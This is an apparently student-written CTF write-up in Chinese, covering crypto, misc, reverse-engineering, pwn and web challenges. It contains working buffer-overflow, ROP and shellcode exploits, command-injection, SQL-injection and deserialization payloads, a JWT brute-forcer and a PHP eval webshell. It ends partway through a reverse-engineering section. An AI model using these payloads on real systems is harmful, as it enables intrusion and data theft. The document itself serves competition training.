@@ -1,0 +1,1166 @@
+# SSHCTF
+
+## Misc
+
+### 签到
+
+复制题目描述
+
+``` 
+SSHCTF{wE1c0m3_2_SSHCTF!}
+```
+
+### 林深时见……熊？
+
+熊曰：嗷嗷
+
+[与熊论道/熊曰加密](http://hi.pcmoe.net/)
+
+``` 
+SSHCTF{ThE-woR1d-Of-enc0diNg-i4-TRuly-f@sCiNaTinNg}
+```
+
+### 可是雪飘进双眼
+
+发现文本中的奇怪空格、空行和制表，可能是文件隐写
+
+题目名称和图片名称都给出了hint：雪，即[SNOW]([The SNOW Home Page (darkside.com.au)](https://darkside.com.au/snow/index.html))
+
+参考文章：[由空格等不可见字符组成的隐写_空白格隐写-CSDN博客](https://blog.csdn.net/qq_51999772/article/details/122418926)
+
+执行`.\SNOW.EXE -C .\flag在哪里.txt output`，拿到flag
+
+``` 
+SSHCTF{F1y to mY l0ve L1k3 @ FlAKe in tH3 SToRm}
+```
+
+### Angrybots & Bugbots
+
+unity早期经典demo，需要找控制台解锁大门，过三道门后就通关了（就是玩游戏）
+
+![](https://s2.loli.net/2024/11/14/NfWh45SiKOGRnpj.png)
+
+
+``` 
+flag1
+SSHCTF{4n9rYbOts_1!5!_@w3S0me!}
+```
+
+这个地方可以掉下去，到达世界最低城
+
+![](https://s2.loli.net/2024/11/14/XLWSAyVd1oQ5ODK.png)
+
+或者进游戏往右下角走，随便走走就走出去了
+
+![](https://s2.loli.net/2024/11/14/bMYNzEL6rvPtFfD.png)
+
+![](https://s2.loli.net/2024/11/14/BMaxfGKnkwAJ28V.png)
+
+``` 
+flag2
+SSHCTF{bU9_1n_Tim3m@chInE}
+```
+
+### Snowy Screen
+
+题目给了一个gif，自然先把帧都拆出来` convert snowy.gif snowy.png`拆出400个图片
+
+发现有个小黑子snowy-379.png是一个二维码，但扫描后仅得到一半flag
+
+![](https://s2.loli.net/2024/11/14/y2hKWoeGlafM6sL.png)
+
+``` 
+_with_sn0wy_sCreeN}
+```
+
+根据hint: 似乎有某种排列方式，🐍🐍🐍 =》蛇形排序
+
+图片有400张，可以拼成20*20的一个正方形
+
+用python拼接图片
+
+```python
+from PIL import Image
+
+png_files = [f'snowy-{i}.png' for i in range(400)] # 图片和.py放在同一个文件夹了
+img_size = 50
+grid_size = 20
+new_img = Image.new('RGB', (img_size * grid_size, img_size * grid_size))
+
+for index, file in enumerate(png_files):
+    img = Image.open(file)
+    row = index // grid_size # 当前行号
+    if row % 2 == 0:
+        col = index % grid_size # 当前列号，每行方向交替
+    else:
+        col = grid_size - 1 - (index % grid_size)
+
+    x = col * img_size
+    y = row * img_size
+    new_img.paste(img, (x, y))
+
+new_img.save('combined_snake_pattern_image.png')
+```
+
+得到拼接后图片
+
+![](https://s2.loli.net/2024/11/14/ivTWMdkFgm7Kw6s.png)
+
+再与下半部分flag合并
+
+``` 
+SSHCTF{H4ving_fun_with_sn0wy_sCreeN}
+```
+
+### See What You Heard
+
+将mp3用Audacity打开，看到某一段音频有长有短有空格，摩斯密码
+
+![See What You Heard](./imgs/See What You Heard.png)
+
+Code：` -.-- --- ..- -.-. .- -. ... . . ... --- ..- -. -.. ...`
+
+到[CyberChef ](https://gchq.github.io/CyberChef/)解码，得到flag
+
+``` python
+SSHCTF{YOUCANSEESOUNDS}
+```
+
+### LSB悟空
+
+根据hint：LSB隐写，将图片用StegSolve打开，查看各个通道，在Red plane 0发现一个二维码
+
+![](https://s2.loli.net/2024/11/14/f5RTPBSojx3JCkr.png)
+
+``` 
+SSHCTF{L5B&QRc0de_ArE_1ntereSing}
+```
+
+### 接受完化吧
+
+一开始尝试学习翻译Phyrexia Language ...... 尝试失败
+
+直接google搜图，得到结果 [A Breakthrough in Phyrexian Language and Communications](https://magic.wizards.com/en/news/feature/a-breakthrough-in-phyrexian-language-and-communications)
+
+![](https://s2.loli.net/2024/11/14/eGoC4Vs7HDbvWOP.png)
+
+``` 
+SSHCTF{all_will_be_one}
+```
+
+### 网络迷踪
+
+车辆靠左行驶，车牌白色，车牌号29-34是4位数字且中间有一横线，推测是日本
+
+背景有"Balenciaga"等国际奢侈品牌，且有跑车，在东京银座比较常见
+
+东京银座位于中央区
+
+``` 
+SSHCTF{日本_东京_中央区}
+```
+
+### SSHjail
+
+有两个通道，通过通道1拿到K，但有7字符限制，`print(K)`是8字符
+
+那么这里可以用`help(K)`，拿到K = authorSmera1d0798
+
+![sshjail_k](imgs/sshjail_k.png)
+
+用通道2，获取flag
+
+- 先`print(__import__('os').listdir('/'))` 
+
+  ![sshjail_list](imgs/sshjail_list.png)
+
+  找到flag在根目录
+
+- 打印flag `print(__import__('os').system('cat /flag'))`
+
+  ![sshjail_flag](imgs/sshjail_flag.png)
+
+``` 
+SSHCTF{PYjaiI_I5_so_COOoL_f74c2e03736f}
+```
+
+## Crypto
+
+### O.o 你没有学过高中数学吗
+
+这是个RSA解密，提示说是高中数学，且有 $$ p^2 + q^2 >= hint2 $$
+
+这个变量命名为hint认为是有原因的，所以 $$ p^2 + q^2 = 2pq = hint2 $$ （假设是这样）
+
+用python解p和q，然后解密
+
+```python
+from Cryptodome.Util.number import *
+import sympy
+import math
+from decimal import Decimal, getcontext
+
+e = 65537
+c = 920 ... 619
+hint1 = 654 ... 866
+hint2 = 130 ... 194
+# 解方程计算p和q
+ch = 2 * hint1 - hint2
+ch1 = ch // 6
+ch2 = hint2 // 2
+getcontext().prec = 100
+delta = (ch1-1) * (ch1-1) - 4 * ch2
+delta = Decimal(delta)
+sqrt_delta = int(delta.sqrt())
+numerator1 = ch1 - 1 + sqrt_delta
+numerator2 = ch1 - 1 - sqrt_delta
+p = numerator1 // 2
+q = numerator2 // 2
+# RSA解密
+n = p * q
+d = inverse(e, (p-1) * (q-1))
+m = pow(c, d, n)
+flag = long_to_bytes(m)
+print(flag)
+
+# SSHCTF{Y0u_4r3_a_g00d_h1gh_sch00l_stud3n7}
+```
+
+### 那些年，我们回不去的高中
+
+用LCG加密flag，线性同余生成器：$$ seed = (a * seed + b)\mod n $$
+
+计算可能的n值，对应解出a和b，然后尝试解密
+
+```python
+from Cryptodome.Util.number import *
+from math import gcd
+s = [ ... ]
+
+# 计算模逆元
+def mod_inverse(a, n):
+    g, x, y = gcd_extended(a, n)
+    return x % n
+
+def gcd_extended(a, b):
+    if b == 0:
+        return a, 1, 0
+    g, x1, y1 = gcd_extended(b, a % b)
+    x = y1
+    y = x1 - (a // b) * y1
+    return g, x, y
+
+
+# 计算差异
+t = [s[i] - s[i - 1] for i in range(1, len(s))]
+
+# 计算可能的n值
+all_n = set(gcd(t[i + 1] * t[i - 1] - t[i] * t[i], t[i + 2] * t[i] - t[i + 1] * t[i + 1]) for i in range(1, len(t) - 2))
+
+# 解密n值
+for n in all_n:
+    n = abs(n)
+    a = (s[2] - s[1]) * mod_inverse((s[1] - s[0]), n) % n
+    b = (s[1] - a * s[0]) % n
+    seed = mod_inverse(a, n) * (s[0] - b) % n
+    plaintext = seed
+    print(long_to_bytes(plaintext))
+    
+# SSHCTF{Stre@m_CipHer_1S_S0OO_ColL!}
+```
+
+### 山有峰顶 海有彼岸
+
+用矩阵加密的，其实就是Hill Cipher换了个n，依旧是C = P x K mod n的解法
+
+用sagemath解出
+
+```python
+import numpy as np
+known_flag = b'The course of ... bu'
+known_flag = list(known_flag)
+known_flag = np.array([known_flag[i:i+4] for i in range(0, 160, 4)])
+cipher_hex = '462b2653 ... 17456'
+cipher = bytes.fromhex(cipher_hex)
+cipher = list(cipher)
+known_cipher = cipher[:160]
+known_cipher = np.array([known_cipher[i:i+4] for i in range(0, 160, 4)])
+four_block_flag = Matrix(known_flag[:4])
+four_block_cipher = Matrix(known_cipher[:4])
+fdet_inv_mod = inverse_mod(four_block_flag.det() % 127, 127)
+# 求Key的模逆矩阵
+f_sub = four_block_flag.adjugate()
+f_inv_mod = Matrix(ZZ, (fdet_inv_mod * f_sub) % 127)
+Key = f_inv_mod * four_block_cipher % 127
+Key_det_inv_mod = inverse_mod(Key.det() % 127, 127)
+Key_sub = Key.adjugate()
+Key_inv_mod = Matrix(ZZ, (Key_det_inv_mod * Key_sub) % 127)
+Key_inv_mod = np.array(Key_inv_mod)
+# cipher -> plaintext
+cipher = np.array([cipher[i:i+4] for i in range(0, len(cipher), 4)])
+flag = []
+for c in cipher:
+    c = np.array(c)
+    p = np.matmul(c, Key_inv_mod) % 127
+    flag += p.tolist()
+print(''.join([chr(c) for c in flag]))
+
+# SSHCTF{CTF_is_r0mant1c!}
+```
+
+### Cignin
+
+签到题，逆着推导即可
+
+```python
+from Cryptodome.Util.number import GCD, long_to_bytes, inverse
+
+# 给出的值
+pq = 939 ... 147
+pr = 755 ... 913
+key1 = 179 ... 245
+c = 288 ... 400
+# p是pq和pr的最大公因数
+p = GCD(pq, pr)
+q = pq // p
+r = pr // p
+# 解密m
+m = (c * inverse(key1, p)) % p
+# 从long回到bytes
+flag = long_to_bytes(m)
+print(flag)
+
+# SSHCTF{Welcome_to_the_world_of_cryptography!cf1c8c33db2050e4}
+```
+
+### 死去的九省联考又在攻击我
+
+通过观察不难发现，m1和m2和m3之间存在 abs(m1 - m2) == m3
+
+这里假设m1 > m2，则有
+$$
+m_3 = m_1 - m_2
+$$
+
+$$
+c_3 = a^{m_3}\mod p
+$$
+
+$$
+c_3 = a^{m1-m2} \mod p
+$$
+
+$$
+c_3 = c_1 * c_2^{-1} \mod p
+$$
+
+```python
+p = 获取到的素数p
+# 如果m1 > m2，则c1 = c1, c2 = c2
+# 哪个c对应的m大哪个放在c1
+c1 = 获取到的c1，c2中的其中一个
+c2 = 获取到的c1，c2中的其中一个
+
+# 计算模逆元
+def mod_inverse(c2, p):
+    gcd, x, y = extended_gcd(c2, p)
+    return x % p
+
+def extended_gcd(a, b):
+    if a == 0:
+        return b, 0, 1
+    gcd, x1, y1 = extended_gcd(b % a, a)
+    x = y1 - (b // a) * x1
+    y = x1
+    return gcd, x, y
+
+inverse_c2 = mod_inverse(c2, p)
+c3 = (c1 * inverse_c2) % p
+print(c3)
+
+# SSHCTF{d05c273e-5dd6-4b84-aae5-76afc674179c}
+```
+
+### 为什么不提示我密码到底哪几位错了
+
+就是猜数字，策略：
+
+先猜个123456，绿色不动，黄色移到下一位，灰色换数
+
+循环猜，猜错重来
+
+``` 
+SSHCTF{cc8afa9b-600a-4e4d-9c1f-d3532f6ecf97}
+```
+
+### baby_ecc
+
+根据加密代码定义椭圆，并依次解码x，key，flag即可，sagemath真好用（
+
+``` python
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+from Crypto.Util.number import long_to_bytes
+p = 187188301035740794158966814748536811423
+ecc = EllipticCurve(GF(p), [5, 2, 1, 1, 7])
+g = ecc(202 ... 715, 511 ... 079)
+cipher = b'4\x8a ... \xe0'
+c_p = ecc(133 ... 821, 574 ... 950)
+x = c_p.log(g)
+key = long_to_bytes(Integer(x), 16)
+aes = AES.new(key, AES.MODE_ECB)
+flag = unpad(aes.decrypt(cipher), 16)
+print(flag)
+
+# SSHCTF{5m0OtH_0rD3R_ShoU16_be_@voI6Ed!2c1bc9546d949637}
+```
+
+## Pwn
+
+### 回不去的何止那年夏天
+
+用id打开，看到有个函数Time_machine返回了shell，查到它的地址，exp直接打
+
+``` python
+from pwn import *
+context.log_level = 'debug'
+context.binary = 'summer'
+#sh = process('./summer')
+sh = remote('210.44.150.15', 45024)
+
+offset = 0x7a + 8
+time_machine_addr = 0x000000000004011DE
+payload = b'a' * offset + p64(time_machine_addr)
+
+sh.sendline(b'yes')
+sh.sendline(payload)
+sh.interactive()
+```
+
+![summer](imgs/summer.png)
+
+```
+SSHCTF{I_R3AI1y_10v3_y0U_dd9530e8f362}
+```
+
+### 邻座Linux同学不时用命令偷偷看我的flag
+
+nc连接直接拿shell，相当于直接拿flag了
+
+``` 
+SSHCTF{7H3_b39iNnlnG_01_tHl5_w0R1d_f57741fdfac3}
+```
+
+### Blackjack
+
+第一局选择16分all in，一直HIT超过21点输掉比赛，此时分数来到了0分
+
+第二轮分数输入-1，这局要赢（输了就重来）
+
+赢了之后，由于score存储类型是unsinged，所以最终分数极大，拿到flag
+
+![blackjack](imgs/blackjack.png)
+
+``` 
+SSHCTF{a_H4ckEr_Sto1e_mY_f1A9_w17H_a_ne6ATlvE_w46ER_3ab2029b8e4d}
+```
+
+### Overflow_key
+
+1. checksec检测，是小端序，看完hint的三个视频，再加上数组溢出，就知道怎么做了。用ida打开：
+
+   ``` 
+    buf: 7字节，前4个必须是'root'
+    v5: buf字节数
+    v4: 10字节，读取到的下一位设置为0，本身仅有char[6]，存在数组溢出
+    v4: 前6字节写在了v4，后
+    check(v4, v5): v4前四位是aaaa，且v5=257
+   ```
+
+2. 小端序存储是低位字节存低地址，高位字节存高地址，根据v5和v4存储的相对位置，得到pwd
+
+   ```
+   low -----------------------------------------> high (addr)
+   loc 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16
+   v5                    01 01 00 00 00 00 00 00
+   pwd 61 61 61 61 00 00 01 01 00 00 00 00 00 00 00
+   ```
+
+3. 获取shell
+
+   ```python
+   from pwn import *
+   context.log_level = 'debug'
+   context.binary = 'terminal'
+   #sh = process('./terminal')
+   sh = remote('210.44.150.15', 25354)
+   username = b'root'
+   password = b'aaaa\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00'
+   # v5 = 257 = 0x101
+   # password(v4) = aaaa = 0x61616161
+   
+   sh.recvuntil(b'Username:')
+   sh.sendline(username)
+   sh.recvuntil(b'Password:')
+   sh.sendline(password)
+   sh.interactive()
+   ```
+
+![terminal](imgs/terminal.png)
+
+``` 
+SSHCTF{NEvER_7AKE_0v3rFIow_IIgH7ly_e9a3d549a38e}
+```
+
+### Signin
+
+nc连接直接拿flag（怎么感觉前面说了一次）
+
+``` 
+SSHCTF{wELC0ME_70_7h3_WOr1D_of_PwN_858132a91ebd}
+```
+
+### 最后的一面以遗憾结尾
+
+1. checksec，NX enabled
+
+   ``` 
+   # checksec last
+       Arch:       amd64-64-little
+       RELRO:      Partial RELRO
+       Stack:      No canary found
+       NX:         NX enabled
+       PIE:        No PIE (0x400000)
+       SHSTK:      Enabled
+       IBT:        Enabled
+       Stripped:   No
+   ```
+
+   用ida打开，发现有 `result()` 执行了 `system("echo \"I want to say I love you.\"")`，但并不是`/bin/sh`
+
+   利用ropgadget查看是否存在/bin/sh
+
+   ``` 
+   ROPgadget --binary last --string '/bin/sh'
+   Strings information
+   ============================================================
+   0x0000000000404050 : /bin/sh
+   ```
+
+   确实存在，且ida内找到_system的地址为：
+
+   ``` 
+   .plt.sec:0000000000401090 ; int system(const char *command)
+   ```
+
+   因为是64位，函数的参数传递使用寄存器，第一个参数在rdi里面，所以先用 pop rdi ret 把 `/bin/sh` 字符串的地址放在rdi然后调用system函数
+
+   同样用ropgadget查看pop rdi和ret的地址
+
+   ``` 
+   # ROPgadget --binary last | grep "pop rdi"  
+   0x0000000000401241 : pop rdi ; ret
+   
+   # ROPgadget --binary last | grep "ret"    
+   0x000000000040101a : ret
+   ```
+
+2. exp，直接返回执行system函数，获取到shell
+
+   ``` python
+   from pwn import *
+   context.log_level = 'debug'
+   context.binary = 'last'
+   #sh = process('./last')
+   sh = remote('210.44.150.15', 41158)
+   elf = ELF('./last')
+   system_plt = elf.plt['system']
+   pop_rdi = 0x401241
+   ret = 0x40101a
+   binsh_addr=0x404050
+   offset = 0x10 + 8
+   payload = b'a' * offset + p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_plt)
+   sh.recv()
+   sh.sendline(payload)
+   sh.interactive()
+   ```
+
+![last](imgs/last.png)
+
+``` 
+SSHCTF{lf_yOU_TRuly_L0Ve_heR_137_HER_Know_74aa73aa8cea}
+```
+
+### babyshellcode
+
+1. checksec，没有保护。本地执行babyshellcode，发现需要输入两次，第一次输入shellcode，第二次提示'opportunity to get shell access'，大概是栈溢出返回到shellcode地址
+
+2. exp，获取到shell
+
+   ```python
+   from pwn import *
+   context.log_level = 'debug'
+   context.binary = 'babyshellcode'
+   #sh = process('./babyshellcode')
+   sh = remote('210.44.150.15', 23952)
+   sh.recvuntil(b'shellcode:')
+   shellcode = asm(shellcraft.sh())
+   sh.sendline(shellcode)
+   
+   addr = 0x601280
+   offset = 0x10 + 8
+   payload = b'a' * offset + p64(addr)
+   sh.recvuntil(b'access.')
+   sh.sendline(payload)
+   sh.interactive()
+   ```
+
+![babyshellcode](imgs/babyshellcode.png)
+
+``` 
+SSHCTF{SHE11C0dE_HE1Ps_YOU_9E7_5HElL_cad5fe5d2704}
+```
+
+## Web
+
+### php-intro
+
+用burpsuite拦截（发送到repeater方便再次更改）
+
+1. 第一关，GET和POST
+   - GET：`/?first=new%20to%20SSHCTF`
+   - POST：改成 POST ：在请求头中加上 `Content-Type: application/x-www-form-urlencoded`，再在请求头后空一行, 写上 `second=CTFer`
+2. 第二关，COOKIE
+   - 添加两个cookie：`user=linnco; password=123456`
+3. 第三关，绕过md5
+   - GET：再加上`&a[]=1&b[]=2`
+
+![phpintro](imgs/phpintro.png)
+
+``` 
+SSHCTF{e0cfcd98cb09}
+```
+
+### Why not ping?
+
+随便ping一个ip，有回显，尝试列出文件目录
+
+输入`127.0.0.1;ls`，得到flag.txt在此目录
+
+输入`127.0.0.1;cat flag.txt`，拿到flag
+
+![ping](imgs/ping.png)
+
+``` 
+SSHCTF{98d22575-a26d-48b0-9452-549433760b64}
+```
+
+### Baby Unserialize
+
+伪造一个$user对象，序列化后base64编码，作为cookie访问页面
+
+先试试phpinfo();
+
+```php
+<?php
+class sshctf{
+    public $in = true;
+    public $cmd = "phpinfo();";
+}
+
+$cookie = base64_encode(serialize(new sshctf()));
+echo $cookie;
+?>
+# Tzo2OiJzc2hjdGYiOjI6e3M6MjoiaW4iO2I6MTtzOjM6ImNtZCI7czoxMDoicGhwaW5mbygpOyI7fQ==
+```
+
+成功pass，将`$cmd`的值设为`system('find / -name *flag*')`，得到flag在/usr/local/etc/flag.txt
+
+执行`system('cat /usr/local/etc/flag.txt')`，得到flag
+
+![unserial](imgs/unserial.png)
+
+``` 
+SSHCTF{58e9ff21-3327-4d31-a4a3-d1662095cb20}
+```
+
+### ezphp
+
+hint：查看robots.txt和利用implode函数
+
+查看/robots.txt，有一个phphpp.php，访问phphpp.php
+
+- GET：`?cover=a[0]=implode&c=sys&d=tem&b=cat /flag`
+
+`parse_str($cover);` 会将cover的值作为php代码解析
+
+根据hint要用implode，所以需要`$a[0] = implode`，推出`cover=a[0]=implode`
+
+`$c` 和 `$d` 是implode的参数，两个拼起来是system即可，这里用`c=sys&d=tem`
+
+`$b` 是system要执行的指令，`d=cat /flag`
+
+![ezphp](.\imgs/ezphp.png)
+
+``` 
+SSHCTF{0021a89a-1f09-4747-85ea-f55702b7f257}
+```
+
+### 钱包危机
+
+访问/robots.txt，服务器钱包详情在/waaaalllllleetttt，得到远程地址，并且远程钱包余额为100，需要101才能够/buyFlag
+
+所以尝试向远程钱包发送1个，这自然是不被允许的的，本地钱包余额不足
+
+故用burpsuite拦截，从远程钱包获取-1个coin，成功，查看服务器钱包余额，变成101了
+
+之后从远程钱包分别获取50 51（有单次限额），buyFlag
+
+![wallet](imgs/wallet.png)
+
+``` 
+SSHCTF{3ff7b1d1-08e5-49c4-a02a-1dc274bb031c}
+```
+
+### madSQL
+
+注意到hint: jwt first
+
+正常登录(Guest)用burpsuite获取到随便一个jwt
+
+我得到的是eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6Imd1ZXN0IiwiZXhwIjoxNzI0NjE4NTg3fQ.Ce96_mDr2FkPVeN51Z-rNTrFFUzImMP1el_yIINgFJg
+
+F12发现try brute force的hint，故用python暴力破解
+
+先用[pydictor](https://github.com/LandGrey/pydictor)生成了1-6位数字密码nums.txt（这题不用也行），然后执行python程序
+
+```python
+import jwt
+
+def runblasting(path, jwt_str):
+    alg = 'HS256'
+    with open(path, 'rb') as f:
+        for line in f:
+            key_ = line.strip()
+            print('use' + key_.decode('utf-8'))
+            try:
+                jwt.decode(jwt_str, verify=True, key=key_, algorithms=alg)
+                print('found key! --> ' + key_.decode('utf-8'))
+                break
+            except:
+                continue
+            else:
+                print('key not found!')
+# nums.txt : 1-6位数字
+runblasting('nums.txt', 'eyJ ... FJg')
+```
+
+得到key=5807，拿去[JSON Web Tokens - jwt.io](https://jwt.io/)
+
+```
+HEADER:
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+PAYLOAD:
+{
+  "identity": "guest",
+  "exp": 1724610414
+}
+VERIFY SIGNATURE:
+HMACSHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload), 
+  5807
+)
+```
+
+修改"identity"为"admin"，得到新的jwt
+
+2. 修改Cookie，进入到/queryuserphone，GET /queryuserphone?user=flag' OR ''='
+
+   得到hint："Upper case And Lower Case"
+
+   利用MySql无大小写检测，查看有哪些表
+
+GET `/queryuserphone?user=' Union Select GrOup_coNcat(table_name),2 FrOm InFoRmAtIoN_ScHeMa.tables WhErE TaBlE_ScHeMa=DaTaBaSe() ANd ''='`
+
+发现有两个表`adwoivfhaoihfagfiuaviuf`, `user`
+
+查看`adwoivfhaoihfagfiuaviuf`有哪些colum
+
+GET `/queryuserphone?user='Union Select GrOup_coNcat(column_name),2 FrOm InFoRmAtIoN_ScHeMa.columns WhErE TaBlE_NaMe='adwoivfhaoihfagfiuaviuf' ANd ''='`
+
+仅有flag，故查询flag
+
+GET `/queryuserphone?user=' Union Select flag,2 FrOm adwoivfhaoihfagfiuaviuf WhErE ''='`
+
+```
+SSHCTF{1e8bfe8b-f9e0-4e5f-b98a-6b87b75a26c5}
+```
+
+### ezUpload
+
+1. 首先做图片马：随便上传一张gif，上传后再下载下来，比对前后有区别，说明二次渲染了
+
+   在上传前后没有变化的区域插入一句话木马   `<?php @eval($_POST['cmd']); ?>`
+
+   上传修改后的gif，再拿下来，发现插入成功
+
+2. 用蚁剑连接`/include.php?filename=<上传后的图片名称>.gif`，连接成功，但shell无法执行指令（ret-1）
+
+   ![image-20240826072316971](C:\Users\Mingz\AppData\Roaming\Typora\typora-user-images\image-20240826072316971.png)同时找到了flag所在位置，但/app/flag无法查看
+
+3. 根据hint: 这shell十分的珍贵，应该先看看有什么东西。不止有php奥
+
+   发现这个wwwweeebbbb.txt也是可读可写可执行，直接改成wwwweeebbbb.php
+
+   删掉其中内容后得到了一个`#Halo AntSword`，这时候觉得做对了，继续看其他文件
+
+   看到Loging.php在往127.0.0.1:33333发包
+
+   将wwwweeebbbb.php的内容改为以下内容（这时候还没加符号链接）
+
+   看到/var/App/www/App下有一个LoggingSoket.py，接受127.0.0.1:33333发送的包，且对file_name有正则检验，` r"flag|key|\."`，我绕不过去（）
+
+   ``` php
+   <?php
+   $host = '127.0.0.1'; 
+   $port = 33333;      
+   $file_name = 'nmmd';
+   // 创建符号链接
+   if (symlink('/app/flag', '/tmp/nmmd')) {
+       echo "symlink success";
+   } else {
+       echo "symlink error";
+   }
+   // 创建socket
+   $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+   if ($socket === false) {
+       echo "socket_create() 失败: " . socket_strerror(socket_last_error()) . "\n";
+       exit;
+   }
+   
+   $result = socket_connect($socket, $host, $port);
+   if ($result === false) {
+       echo "socket_connect() 失败: " . socket_strerror(socket_last_error($socket)) . "\n";
+       socket_close($socket);
+       exit;
+   }
+   // 要发送的data
+   $form_data = [
+       'file_name' => $file_name,
+       'key' => md5('web' . trim(file_get_contents('/w')))
+   ];
+   
+   $json_data = json_encode($form_data);  
+   socket_write($socket, $json_data, strlen($json_data)); 
+   $buffer = socket_read($socket, 1024, PHP_BINARY_READ);  
+   socket_close($socket);
+   echo $buffer; 
+   ?>
+   ```
+
+4. 所以用symlink将`/tmp/nmmd`（这个名随便）链接到`/app/flag`，这样LoggingSoket.py接收到包后，由于`Path('/tmp').joinpath( upload_name).resolve()`中有resolve，将会把任意链接转换成绝对链接，故执行效果为将`/app/flag`复制到`/tmp/flag.txt`，可以查看，得到flag
+
+   ![upload](.\imgs/upload.png)
+
+   ![upload_flag](.\imgs/upload_flag.png)
+
+```
+SSHCTF{b536fe7a-51a5-48be-8cd9-a65eb8176355}
+```
+
+## Re
+
+### baby crack
+
+无壳，直接拖入ida
+
+查看main函数
+
+![baby_crack_main](imgs/baby_crack_main.png)
+
+Str即flag，38个字符，前7个是SSHCTF{
+
+有个函数sub_401550(Str, aSshctfkey)，打开查看
+
+![baby_crack_sub](imgs/baby_crack_sub.png)
+
+发现加密的方式：
+
+- 根据固定的随机数种子：0xDEADBEEF生成37个范围在0~254的整数
+- 一顿运算
+
+``` python
+key = "SSHCTFkey"
+arr = [201, 34, 74, 60, 108, 98, 249, 249, 111, 177,
+       146, 73, 118, 241, 190, 203, 137, 113, 40, 169,
+       115, 82, 249, 180, 94, 254, 243, 132, 199, 61,
+       235, 137, 117, 190, 106, 61, 19, 125]
+a1 = arr
+a2 = [ord(k) for k in key]
+
+# random.seed(0xDEADBEEF) 固定的随机种子 不能用python生成，因为算法不一样
+strlen_a2 = len(a2)
+r = [232, 90, 117, 135, 98, 176, 175, 24, 8, 123, 
+     84, 245, 112, 135, 139, 71, 23, 72, 4, 144,
+     110, 181, 55, 140, 156, 151, 75, 136, 53, 253,
+     7, 32, 95, 73, 116, 219, 63] # 用c生成的随机数
+
+for i in reversed(range(37)):
+    v3 = r[i]
+    xor_a1 = a1[i] ^ (i & 0x12 | a2[i % len(a2)] & 0x3F)
+    if ((v3 & xor_a1) | ~(v3 | xor_a1) | 7) > 63:
+        a1[i] = xor_a1
+    a1[i] ^= a1[i + 1]
+    c = a2[v3 % len(a2)] % 8
+    a1[i] = (a1[i] >> (8 - c)) | (a1[i] << c) & 0xFF
+
+print("".join([chr(a) for a in a1]))
+
+# SSHCTF{N0w_y0u_Kn0w_B1twise_op3r@t0rs}
+```
+
+### Let's go to learn Cry
+
+无壳，直接拖入ida
+
+发现加密算法非常复杂，hint给了说是Cypto，从零开始逆向的话就真成Crypto了，所以稍微看看代码，可以看出是AES加密，key和base64编码后的ciphertext都已经给出，直接python解密
+
+![recry_key](imgs/recry_key.png)
+
+![recry_cipher](imgs/recry_cipher.png)
+
+``` python
+import base64
+from Cryptodome.Cipher import AES
+
+key = b"9e015a9f82d367bc"
+encoded_ciphertext = "KKN+NK5ZWN4xr4kM1+qq+2wJKUEEaiWmITgnvi2VaXfjscLoN2sbUObWbnc45pZr"
+ciphertext = base64.b64decode(encoded_ciphertext)
+
+aes = AES.new(key, AES.MODE_ECB)
+flag = aes.decrypt(ciphertext)
+
+print(flag)
+
+# SSHCTF{Crypt0_1n_R3v3rs3_1s_so000oo0_Imp0rt@nt!}
+```
+
+### Tetris
+
+一开始想的是改score，尝试直接改值，查地址，拖到ida里看代码都不行
+
+评价为想复杂了，如果我不能通过作弊拿到60分pass期末，那我为什么不可以让老师将及格线改为0分呢？（恼）
+
+114514这个值要拿去比较，而且也不常见，直接改这个值就可以
+
+打开游戏后，用cheat game打开进程（建议设个pause的快捷键），一次搜索就找到了，直接改为0
+
+![image-20240828103051960](C:\Users\Mingz\AppData\Roaming\Typora\typora-user-images\image-20240828103051960.png)
+
+![image-20240828103214634](C:\Users\Mingz\AppData\Roaming\Typora\typora-user-images\image-20240828103214634.png)
+
+``` 
+SSHCTF{T3tr1s_1s_E4sY!}
+```
+
+### SMC是什么
+
+无壳，直接拖入ida
+
+可以看到程序主要内容，但是有VirtualProtect，题目名称又叫smc，所以是一道smc题，需要加断点动态调试
+
+找到代码自加密的部分，看一下sub_1400011C0的数据段，是一坨
+
+![smc_o](imgs/smc_o.png)
+
+所以就是在这加断点了（第15行）
+
+![smc_break](imgs/smc_break.png)
+
+开debugger，随便输入一串。然后需要使用ida的重编译功能，从0x1400011C0选中到0x14000127E这整个一段。按u回到字节文本状态，再回到这一段的开头，按p重新编译，按f5，得到正确的函数
+
+![smc_new](imgs/smc_new.png)
+
+python解密
+
+``` python
+# flag[i] == Str[i] ^ 0x23
+print(''.join([chr(i ^ 0x23) for i in b"EOBDXZFP|V|GL|JW^"]))
+
+# SSHCTF{yes_u_do_it}
+```
+
+### 迷宫又见迷宫
+
+无壳，直接拖入ida
+
+查看发现就是3个迷宫（一个迷宫15*15，总共在byte_4020里面有675个数）
+
+![ez_maze](imgs/ezmaze.png)
+
+``` 
+1 可通过
+0 障碍物
+3 玩家
+4 终点
+wsad 上下左右
+```
+
+``` python
+import hashlib
+
+maze = [ ... ] # 原始迷宫数据
+
+def maze_to_str(maze_list):
+    s = ''
+    for x in range(15):
+        for y in range(15):
+            s += str(maze_list[x][y])
+        s += '\n'
+    return s
+
+maze1 = [maze[i:i+15] for i in range(0, 15*15, 15)]
+maze2 = [maze[i:i+15] for i in range(15*15, 15*15*2, 15)]
+maze3 = [maze[i:i+15] for i in range(15*15*2, 15*15*3, 15)]
+
+# print(maze_to_str(maze1))
+# print(maze_to_str(maze2))
+# print(maze_to_str(maze3))
+
+# 迷宫比较小，手动解效率更高，没必要写个搜索了
+s1 = 'ddsssddddsssdss'
+s2 = 'dddddsssddddsssaassssddds'
+s3 = 'ddssddwddssssssdddssssdddss'
+
+print('SSHCTF{' + hashlib.md5((s1+ s2 + s3).encode('utf-8')).hexdigest() + '}')
+
+#SSHCTF{aeea66fcac7fa80ed8f79f38ad5bb953}
+```
+
+### flower
+
+无壳，直接拖入ida，无法直接F5反编译
+
+hint给出花指令，那么可能是哪一部分有混淆，在main尝试按P，报错：
+
+```
+.text:004010A2: The function has undefined instruction/data at the specified address.
+Your request has been put in the autoanalysis queue.
+```
+
+直接跳到.text:004010A2，发现了花指令
+
+![flower](imgs/flower.png)
+
